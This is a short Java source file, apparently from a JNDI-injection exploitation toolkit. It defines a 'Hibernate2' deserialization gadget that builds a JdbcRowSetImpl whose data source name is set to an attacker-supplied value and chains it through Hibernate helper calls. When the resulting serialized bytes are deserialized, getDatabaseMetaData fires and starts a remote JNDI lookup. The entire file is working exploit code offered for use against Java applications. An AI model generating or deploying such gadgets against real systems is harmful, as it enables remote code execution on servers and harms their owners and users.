package com.nu1r.jndi.gadgets;

import com.nu1r.jndi.enumtypes.PayloadType;
import com.sun.rowset.JdbcRowSetImpl;

public class Hibernate2 {

    public static String[] getDependencies() {
        return Hibernate1.getDependencies();
    }

    public static byte[] getBytes(PayloadType type) throws Exception {
        String command = String.valueOf(type);
        JdbcRowSetImpl rs = new JdbcRowSetImpl();
        rs.setDataSourceName(command);
        return (byte[]) Hibernate1.makeCaller(rs, Hibernate1.makeGetter(rs.getClass(), "getDatabaseMetaData"));
    }
}
